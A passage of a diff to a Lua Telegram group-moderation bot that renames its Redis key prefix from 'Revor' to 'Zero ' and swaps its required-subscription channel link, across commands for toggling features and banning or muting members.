-Redis:set(Revor.."Revor:Status:KickMe"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:KickMe"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل اطردني ","md",true)
 end
 if TextMsg == 'نزلني' then
-Redis:set(Revor.."Revor:Status:remMe"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:remMe"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل نزلني ","md",true)
 end
 if TextMsg == 'البوت الخدمي' then
@@ -4049,10 +4052,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:BotFree",true) 
+Redis:set(Zero .."Zero :BotFree",true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل البوت الخدمي ","md",true)
 end
 if TextMsg == 'التواصل' then
@@ -4060,10 +4063,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:TwaslBot",true) 
+Redis:set(Zero .."Zero :TwaslBot",true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل التواصل داخل البوت ","md",true)
 end
 
@@ -4075,15 +4078,15 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if TextMsg == 'الرابط' then
-Redis:del(Revor.."Revor:Status:Link"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:Link"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الرابط ","md",true)
 end
 if TextMsg == 'الترحيب' then
-Redis:del(Revor.."Revor:Status:Welcome"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:Welcome"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الترحيب ","md",true)
 end
 if TextMsg == 'الايدي' then
@@ -4091,10 +4094,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Status:Id"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:Id"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الايدي ","md",true)
 end
 if TextMsg == 'الايدي بالصوره' then
@@ -4102,10 +4105,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Status:IdPhoto"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:IdPhoto"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الايدي بالصوره ","md",true)
 end
 if TextMsg == 'ردود المدير' then
@@ -4113,10 +4116,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Status:Reply"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:Reply"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل ردود المدير ","md",true)
 end
 if TextMsg == 'ردود المطور' then
@@ -4124,10 +4127,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Status:ReplySudo"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:ReplySudo"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل ردود المطور ","md",true)
 end
 if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
@@ -4135,10 +4138,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Status:BanId"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:BanId"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الحظر , الطرد , التقييد","md",true)
 end
 if TextMsg == 'الرفع' then
@@ -4146,26 +4149,26 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Status:SetId"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:SetId"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الرفع ","md",true)
 end
 if TextMsg == 'الالعاب' then
-Redis:del(Revor.."Revor:Status:Games"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:Games"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الالعاب ","md",true)
 end
 if TextMsg == 'التحقق' then
-    Redis:del(Revor.."Revor:Status:joinet"..msg_chat_id) 
+    Redis:del(Zero .."Zero :Status:joinet"..msg_chat_id) 
     return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل التحقق ","md",true)
     end
 if TextMsg == 'اطردني' then
-Redis:del(Revor.."Revor:Status:KickMe"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:KickMe"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل اطردني ","md",true)
 end
 if TextMsg == 'نزلني' then
-Redis:del(Revor.."Revor:Status:remMe"..msg_chat_id) 
+Redis:del(Zero .."Zero :Status:remMe"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل نزلني ","md",true)
 end
 if TextMsg == 'البوت الخدمي' then
@@ -4173,10 +4176,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:BotFree") 
+Redis:del(Zero .."Zero :BotFree") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل البوت الخدمي ","md",true)
 end
 if TextMsg == 'التواصل' then
@@ -4184,10 +4187,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:TwaslBot") 
+Redis:del(Zero .."Zero :TwaslBot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل التواصل داخل البوت ","md",true)
 end
 
@@ -4199,7 +4202,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4215,10 +4218,10 @@ end
 if Controller(msg_chat_id,UserId_Info.id) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:BanAll:Groups",UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :BanAll:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:BanAll:Groups",UserId_Info.id) 
+Redis:sadd(Zero .."Zero :BanAll:Groups",UserId_Info.id) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم حظره عام من المجموعات ").Reply,"md",true)  
 end
@@ -4229,7 +4232,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4242,10 +4245,10 @@ end
 if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:BanAll:Groups",UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :BanAll:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:BanAll:Groups",UserId_Info.id) 
+Redis:srem(Zero .."Zero :BanAll:Groups",UserId_Info.id) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
 end
@@ -4256,7 +4259,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4272,10 +4275,10 @@ end
 if Controller(msg_chat_id,UserId_Info.id) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:ktmAll:Groups",UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :ktmAll:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:ktmAll:Groups",UserId_Info.id) 
+Redis:sadd(Zero .."Zero :ktmAll:Groups",UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم كتمه عام من المجموعات ").Reply,"md",true)  
 end
 end
@@ -4285,7 +4288,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4298,10 +4301,10 @@ end
 if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:ktmAll:Groups",UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :ktmAll:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:ktmAll:Groups",UserId_Info.id) 
+Redis:srem(Zero .."Zero :ktmAll:Groups",UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
 end
 end
@@ -4311,7 +4314,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4320,7 +4323,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4336,10 +4339,10 @@ end
 if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم حظره من المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId_Info.id) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم حظره من المجموعه ").Reply,"md",true)  
 end
@@ -4350,7 +4353,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4369,10 +4372,10 @@ end
 if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء حظره من المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId_Info.id) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء حظره من المجموعه  ").Reply,"md",true)  
 end
@@ -4384,7 +4387,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if GetInfoBot(msg).Delmsg == false then
@@ -4403,10 +4406,10 @@ end
 if StatusSilent(msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم كتمه في المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم كتمه في المجموعه  ").Reply,"md",true)  
 end
 end
@@ -4416,7 +4419,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4429,10 +4432,10 @@ end
 if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء كتمه من المجموعه ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم الغاء كتمه من المجموعه ").Reply,"md",true)  
 end
 end
@@ -4442,7 +4445,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4451,7 +4454,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserId_Info = LuaTele.searchPublicChat(UserName[3])
@@ -4489,7 +4492,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4498,7 +4501,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4534,7 +4537,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
